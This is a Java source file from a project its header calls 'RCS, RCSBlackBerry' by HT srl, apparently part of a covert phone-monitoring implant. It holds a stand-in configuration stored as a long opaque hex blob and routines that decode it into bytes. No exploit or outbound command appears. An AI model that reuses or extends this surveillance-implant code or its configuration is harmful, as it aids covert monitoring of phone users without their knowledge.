//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package fake;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;

public class InstanceConfigFake {
    //#ifdef FAKECONF
     
    // 3012
    static String configString = "37859ac95b903efa563a0a5947a3afa1c5e6d9c7a510adce4b0bbc656f9408ed9325df551d3e9da77e5f61630b41d00e45e1c78ca3a22cf8fde8f9bc2d8e8feece9fc8efbc3369b25a2406bd8452f9125bef0c095121febac5e63f35f4af1d6d360d560938adc8872d0d43ef780ec1881673652417c0b20635925fc7dd3a43f72c9548870e6fc3292bff96bff9d669c1135b266bab0099b4c7398477fd7998e3ec4f7d017922b4d7800381f15620c62ae75e79cd71cef331fce6492a6cf6d02f879b5a32c9ac3262a251f9101520bf251bca75be032e3b1f57cd94c803743e2e6f7c2af822d6f54f95b157c711d65b8ee98cf64cf9ba430bede1eb2a684fc420d2feb79cbbfe9950e69ea4cc4e440e0f480cff59f1c16abe46b9056af0a7fa3e7e8e778e753b620cd4a0ee6437ac53fde6fbafb15b95fac6fe9cc7446c0c9db35ef07319a9b6fc66f8e69f57cfbbb67044d14b48947b3f925e425c412f8f580f713932c6f2f6806aa9f432dc68bdac86bf442c13a6b44c5879729b2b065deb3088770e311c7fabc24da228a2e24e8cb97c654c8d192381b1698e75ed190cdf11f34b52fe47285f7d3b53ec0530c36bfbea5962e7212f10d31e0010d74468ace04d2078e5095324979dff76c600bd349b3c5ecbfd9485d36ea77da3d64bdb24e93820830186bc76e654118ef9203f79c9a2f784d45c6d45533dbd15fdb2d45f71603f744ca30d47c8402d37aaf233f3ee3309a3d5492fc95550ab7db11c1f90d299bcfc2c9fd59aef0256b025e0be6b98e1a3e5f5adbd7e6244de4b5124f30246c2ac0f77af23b6721491457c7b1577c0aeaebdb50727cf0c44d38a4f4716ef77cb81e9dfedc88dfe92003371b3ea016a264ff96861b65875cd4937db2652cbd7e8b85bae225ce8ff189fa34fca3e3847509dfc83d784ab5bbb26c39d1812641bc67e6d4f6857adfd474304ee8aad3d7ecf8547dd708b3099066bd0b55204840975b991ed5f02dffc5e7944f76cce42e736b328e095ecd69fd65d62a06478bc28b069d586e5444e2e0392b05c71499590395cf8cd42479f04986818ec33b3b30253dd11180412c34d534a019a3c52ab80baecb81c67a554f355d2c854b4b40b31b151efa526e4d78689d3a8445a00a9c5cfd0e4a8220e4def8b90ab9b7ec12492ee68fe81700a38fb3b1c62c29f607995de833828bcc4706bcbe7bc36d73a8addcd3df4a3a7c64acf12cd914091b91b211f6e67989dc23322450bf3007a2dd2c57efd122d22baedada3c1ce729540d31b1ed96af049533b6f3a031f86351eaf7560bd5ec16b4a715a3ba40c50b6d4c9eddb8e6a739d9efe4482ec37bd6bf09c7bd84cc8ef3a55b7e31d49c8ec246e6072c1c45b0a81886f158c08cbcb2b182d4fa43002c339180115385b8067f685f723323db2912cceff49bf653b0b4d79b2d6b1bcff6d452c6145b7051d609dc60440595c67f8e355d8ea94d6cea20e922b96ddb152b8e7a546cf6f2ec28f36a3eb273959c34698c0979613eb3e0a25aad73aab3bee38810161306bcb07f2543e325fc1c7755e60de8fddc48bb23137490e4cb4c3aa40a7591f06b24e4d627ae5e624a7c4cc399b4cb1353ce5f5983ac4ccad2294a4956abbe241c4983fd4bc22f66327dc547e945ff3b2d8498264d33084c6e723c57121195b94686948d7a318b936e94baf7912371903d72c3d7c0a840fcc42062ff97faf629791c3c648de26edf6d1c3c9e880d2bf4e829400b7bfb13a32c1b303eb5b66d14322842be00cb31d86feec811a3a8155b57bcae3802d77a67b9da5fdc221116de43c484f95dff6fd1ea22f76d3753f69a32fd7158c761890572597aa1131c71352d12bcb646741eec18b05c9f72f4c3b3fb08f8444bf542c0549ee9dbb73a19c6d7231724cf4f362a0dd088aa01cb185c930cfceb2702bb4269d018168e7b687becb7498b6079c353a6dfb9c241988c290eb22dfa9fc4ed6af660ee0fe508c6bfa1b603561477cd2700b5b8dd4e65efbe7eecd0e8fd940fd6dee5b55b446f1ef8776b351053b8f8aeed5abf273b3be7a4f535928bd9095f05471299ffa82dc4286b6ce87c365e958c41822dbaeb78255324f903c31c5d1814d30c2cdf56e2953103c244bd0c6542e00f38787f0038123f67891efc4303eb864219d110a21eded720e00c9d3039669b5bb1f271e902caab35c696c23f757a8e103d8ced7c35922970c8431d263f89c9f8f013f1c08ec66f7cda7007ca09a906728f176680ef7750a132caeaadb1401693d38ae1cf44db0894c4011fc181b6b34e4d030e4ae2bc80960abb671c26a559637e6a0c04859cb018a7b6da67a23493240570df890df63bb96daf8ac5540ff2bf401378393d40060ca44f87a4f86cc906909411c5dd6f0794c17ae0f7c8824be37739d49dd600d29224fd88e6647e52d98b60702fa9d20b3293fa7d8378bc5697f2e9b773ce25ce06c8de0dd6cb57ed6ebea7fb1cb7db103f03a13c64952e65df6646099a562bdb4e3f3b520960c65db4f141dac495f7317998175cd2a7c014a0686ad62bc0bf66047faa928eba4f42996a5bab6b39e9c5d9e39fd6ebd8a377e2d4507e992c007508ddc36083f1253c445b24294f94bdc959a51375e1e03999c98d5eb0dbe332818e2274d2238afd5d7fd106427afda3bd6d6edb0294389c6ad5e516ad43176e0ca7a4ac2eceff1e83da5b1bb0323411b4cf48da55a09b8abc026b9ec64a19459f91e306fa7b4208754a997c317dd1fc61f072db8c69844b7eb15840e9bf6a43112e1d48cc724c696dd4acae16dc46c093ff8217f2d57992336d3fecac1ca803a746ba916aa940353cd1082e5588e58c2d7b5d69641b845998032578ce072d986df0a9d7f4fc58fae2f164071be5ff35a97dbf8cad2740470a776b1ee12bc93ad5de256e6f2858fb460620c70e88a0c5bb3f2380ad6ce867215c60c1cbffcdc8c9187f59f97e89bc4a61111d7a74dfd0358d99577232c5cd68fb8116052e7eccf8e9d19793d3a6300697c8b551f5ededc40fd3dcb47fff6d9c9c31b477b9449dd4f6ae5ff0b169a7f7fdafc3da7ceff1578fe84ed27cfd21ef7efaafa014286531ed717e26fd77e00e6ea745e320d403c42f3e7b58f637b3afedd8fc20e985eb18a67e243bf811a2a8dd4240a45054b0ad8479d0fe6c39c51c2aba2cb271446fcc7d9e460b9b6a147d8b63113fd986ccb53e2756a5cdeff7f70f993d4e6cd0e0e9b89ce38297d32d5d9f2e80b51e2088c137d9d3f29ce49b23ae43703b2f1585279fe4e63526be6353069bb34285975f714d483d63286af7d799ae2a42fb5e5c078800883d1dbfe04d7f8f78156fd809b26bdfcde1d9dafb04dd7048d28d60370ab9af1026e064a2b6681630dff14f12c5876c64280317ea579c31c90f237e12b4cafd0fdfd5c4fbc9ad4381342745351b09fef3478f2450e23d0062d41fcad32a423016cbae6d93cc8668af3dd3883f82194afffbfa0e368f7fcc2f343a6a7859858f63ca99e76fed6a6b7fe6290bde098da722f6cc348ac9250714d707aea3b9be8587802362afb8f9573eecfac8b63ceb739de0215f3b6f15fb07de8ed7bb40439fd4abcfda297731f6752d414fb7f68e0a54c64ee9afe3facb8a3e0fcc10d1c4d28bdf1afd99c48deaaa358d70f1a652c197c24e0afc14dd836259bbd3ef366a97603a54d3b182e85f4b60c848662d4b3b1c56cec4e2a22588e6ec12d9a7112c9a23230e6da1df0204db68b0c46e344b985b354f76af4b97a228826abb1166a94e25306a1900efea7a592a4eb68789a0c954da597195ce2f5f3794e70d59a6c622f229db86e9162e27fde2899d13015132a02e6596f1e34b1dc9f7e7d8c20b3bb41abfb39868ffbffa06438375d16eaf48e5e535cbbc9a8028fd505b643a5240224c03692074a71c964d38d42873a7400afc69539aad0d80fa04ab15602e0a22438a8616846087a474ef75a9082a155eb93c86857e04f0b42e804ace16fd615c9c62435a9b6e11a5b46bdd07c997ac5ba3525f3718cdcf85acdf06b2c20c81bee30ff80ab46edc27b0b06c37fe026feb9b646b33351efe46595f1e9e870c8740b86b0167656d1676a30f254c81370f920567f2cdf5e3cea5cff4cf086abcf831789c7105a616c1570f45604eeafbf400f70d8788b2922402fd443949ddd3adff2ea267bb6ea722d6f2e788fd613bacc3cd039aee6f911ff17f444c952e86f89e2402521102e2623";
    static byte[] config;
    
    public int version = 2;

    public static byte[] getBytes() {        
        config = hexStringToByteArrayWithLen(configString);        
        return config;
    }
    
    /**
     * Hex string to byte array.
     * 
     * @param wchar
     *            the wchar
     * @return the byte[]
     */
    public static byte[] hexStringToByteArrayWithLen(final String config) {
        int offset = 4;
        int len = config.length() / 2;
        final byte[] ret = new byte[ len + 4];

        for (int i = offset; i < ret.length; i++) {
            final char first = config.charAt((i - offset) * 2);
            final char second = config.charAt((i - offset) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }
        
        final DataBuffer databuffer = new DataBuffer(ret, 0, 4, false);
        databuffer.writeInt(len);

        return ret;
    }
    
    public static byte[] hexStringToByteArray(final String config) {
        int len = config.length() / 2;
        final byte[] ret = new byte[ len ];

        for (int i = 0; i < ret.length; i++) {
            final char first = config.charAt((i ) * 2);
            final char second = config.charAt((i ) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }

        return ret;
    }
    
    //#else
    public static byte[] getBytes() {        
        return null;
    }
  //#endif
}

